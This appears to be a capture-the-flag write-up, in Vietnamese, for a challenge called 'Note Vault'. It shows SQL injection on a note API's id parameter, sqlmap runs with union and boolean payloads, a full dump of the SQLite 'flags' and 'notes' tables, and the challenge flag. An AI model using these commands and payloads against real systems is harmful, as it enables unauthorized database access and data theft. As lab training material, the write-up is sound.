# Note Vault

## ANALYZE

<figure><img src="../../.gitbook/assets/image (130).png" alt=""><figcaption></figcaption></figure>

ở bài này thì chúng ta có được 1 số thông tin là nó có chứa 1 api là `/app/note?id=1`&#x20;

ở đây ta sẽ có 1 vài giả thuyết rằng là nó có thể là IDOR hoặc sqli

<figure><img src="../../.gitbook/assets/image (131).png" alt=""><figcaption></figcaption></figure>

Và đến bước này ta hoàn toàn CF rằng đây chính là sqli

<figure><img src="../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>



Đến đây thì ta xác nhận được dbms chính là SQLite

```bash
canhieu@DESKTOP-DBGES7N:~$ sqlmap -u "http://gateway.sanchoi.iahn.hanoi.vn:30038/api/note?id=1" -p id --batch --cookie="FCTF_Auth_Token=eyJleHAiOjE3NzYwMTI4NjUsInJvdXRlIjoidGVhbS0xMi0xNi1ub3RlLXZhdWx0LTE3NzYwMTEwNTYifQ.yiJR_-wVaEXpATnUyWUylQUxmGKqv_a6mOoMKa6-5yU"
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.10#stable}
|_ -| . ["]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:44:05 /2026-04-12/

[16:44:05] [INFO] resuming back-end DBMS 'sqlite'
[16:44:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 4158=4158

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=1 UNION ALL SELECT NULL,CHAR(113,112,118,106,113)||CHAR(75,80,106,78,117,121,70,85,65,72,113,84,77,71,76,116,110,106,121,89,77,65,104,99,78,89,90,74,118,74,77,67,77,69,120,66,81,86,114,106)||CHAR(113,120,118,98,113)-- uWUb
---
[16:44:05] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[16:44:05] [INFO] fetched data logged to text files under '/home/canhieu/.local/share/sqlmap/output/gateway.sanchoi.iahn.hanoi.vn'

[*] ending @ 16:44:05 /2026-04-12/
```

Và xác nhận được đây là dạng SQLi dạng Union based



## EXPLOIT

Ta sẽ tiến hành thêm 2 cờ là dump và tables để tìm bảng và dump data ra

```bash
canhieu@DESKTOP-DBGES7N:~$ sqlmap -u "http://gateway.sanchoi.iahn.hanoi.vn:30038/api/note?id=1" -p id --batch --cookie="FCTF_Auth_Token=eyJleHAiOjE3NzYwMTI4NjUsInJvdXRlIjoidGVhbS0xMi0xNi1ub3RlLXZhdWx0LTE3NzYwMTEwNTYifQ.yiJR_-wVaEXpATnUyWUylQUxmGKqv_a6mOoMKa6-5yU" --dbms=SQLite --tables --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.10#stable}
|_ -| . [.]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 16:45:05 /2026-04-12/

[16:45:05] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 4158=4158

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=1 UNION ALL SELECT NULL,CHAR(113,112,118,106,113)||CHAR(75,80,106,78,117,121,70,85,65,72,113,84,77,71,76,116,110,106,121,89,77,65,104,99,78,89,90,74,118,74,77,67,77,69,120,66,81,86,114,106)||CHAR(113,120,118,98,113)-- uWUb
---
[16:45:05] [INFO] testing SQLite
[16:45:05] [INFO] confirming SQLite
[16:45:05] [INFO] actively fingerprinting SQLite
[16:45:05] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[16:45:05] [INFO] fetching tables for database: 'SQLite_masterdb'
<current>
[2 tables]
+-------+
| flags |
| notes |
+-------+

[16:45:05] [INFO] fetching columns for table 'flags'
[16:45:05] [INFO] fetching entries for table 'flags'
Database: <current>
Table: flags
[1 entry]
+----+----------------------------------+
| id | flag                             |
+----+----------------------------------+
| 1  | FCTF{union_select_to_the_rescue} |
+----+----------------------------------+

[16:45:05] [INFO] table 'SQLite_masterdb.flags' dumped to CSV file '/home/canhieu/.local/share/sqlmap/output/gateway.sanchoi.iahn.hanoi.vn/dump/SQLite_masterdb/flags.csv'
[16:45:05] [INFO] fetching columns for table 'notes'
[16:45:05] [WARNING] reflective value(s) found and filtering out
[16:45:05] [INFO] fetching entries for table 'notes'
Database: <current>
Table: notes
[3 entries]
+----+----------+-------------------------------------------------+
| id | title    | content                                         |
+----+----------+-------------------------------------------------+
| 1  | Welcome  | This vault stores internal notes by numeric ID. |
| 2  | Dev Note | Do not expose sensitive tables to API users.    |
| 3  | TODO     | Review SQL query building logic before release. |
+----+----------+-------------------------------------------------+

[16:45:05] [INFO] table 'SQLite_masterdb.notes' dumped to CSV file '/home/canhieu/.local/share/sqlmap/output/gateway.sanchoi.iahn.hanoi.vn/dump/SQLite_masterdb/notes.csv'
[16:45:05] [INFO] fetched data logged to text files under '/home/canhieu/.local/share/sqlmap/output/gateway.sanchoi.iahn.hanoi.vn'

[*] ending @ 16:45:05 /2026-04-12/

canhieu@DESKTOP-DBGES7N:~$
```





## FLAG

```
FCTF{union_select_to_the_rescue}
```
